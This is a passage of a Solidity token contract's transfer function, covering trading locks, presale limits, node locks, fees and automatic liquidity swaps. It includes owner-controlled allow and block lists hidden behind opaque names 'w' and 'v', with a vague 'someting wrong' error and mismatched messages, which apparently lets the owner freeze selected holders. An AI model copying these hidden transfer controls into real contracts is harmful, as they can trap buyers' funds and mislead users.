    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if(!w[from]){
            require(isTrading, "trading not open");
        }
        //
        if(NodeList[from]){
            require(balanceOf(from).sub(amount)  >= NodeLockAmounts, "Node Transfer amount must be greater than zero");
        }
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!v[from], "someting wrong");

        //Is it private placement or pre-sale
        if(PreSaleList[from].isPresale){
             require(PreSaleList[from]._amount >= amount, "Presale User Transfer amount must be greater than zero");
        }

        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));

        bool overMinTokenBalance = contractTokenBalance >=
            numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = contractTokenBalance.mul(99).div(100) ;// numTokensSellToAddToLiquidity;
            //add liquidity
            swapAndLiquify(contractTokenBalance);
        }

        //indicates if fee should be deducted from transfer
        bool takeFee = true;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from, to, amount, takeFee);

        if(PreSaleList[from].isPresale){
            PreSaleList[from]._amount =  PreSaleList[from]._amount.sub(amount);
        }


        //buy one can be  sell  two
        if(from == uniswapV2Pair && PreSaleList[to].isPresale){
             PreSaleList[to]._amount = amount.mul(2);
        }
    }

    function setSellMin(uint256 amount) public onlyOwners{
